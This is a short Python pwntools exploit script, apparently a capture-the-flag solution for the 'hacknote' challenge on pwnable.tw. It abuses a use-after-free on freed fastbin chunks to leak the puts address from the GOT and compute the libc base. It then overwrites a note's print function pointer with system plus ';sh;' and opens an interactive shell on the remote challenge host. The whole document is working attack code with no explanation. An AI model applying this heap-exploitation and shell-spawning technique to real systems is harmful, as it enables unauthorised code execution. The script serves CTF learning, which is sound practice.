from pwn import *


libc = ELF('./libc_32.so.6')
#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
elf = ELF('./hacknote')

def addnote(size,Content):
    io.sendlineafter('Your choice :','1')
    io.sendlineafter('Note size :',str(size))
    io.sendafter('Content :',Content)

def delnote(idx):
    io.sendlineafter('Your choice :','2')
    io.sendlineafter('Index :',str(idx))

def show(idx):
    io.sendlineafter('Your choice :','3')
    io.sendlineafter('Index :',str(idx))


def exploit():
    addnote(0x30,"A"*0x30)#0
    addnote(0x30,"B"*0x30)#1


    delnote(0)  #fastbinsY[0]->chunk0
    delnote(1)  #fastbinsY[0]->chunk1->chunk0


    addnote(0x8,p32(0x804862b)+p32(elf.got['puts']))#2
    show(0)
    puts =  u32(io.recv(4))
    print("Puts: "+ hex(puts))
    libc_base = puts - libc.symbols['puts']
    print("Libc base: "+hex(libc_base))
    system = libc_base + libc.symbols['system']
    print("System: "+hex(system))

    delnote(2) #fastbinsY[0]->chunk1->chunk0
    addnote(0x8,p32(system)+b";sh;")#3
    show(0)
    io.interactive()


#io = process('./hacknote')
io = remote('chall.pwnable.tw',10102)
context.log_level = "debug"
exploit()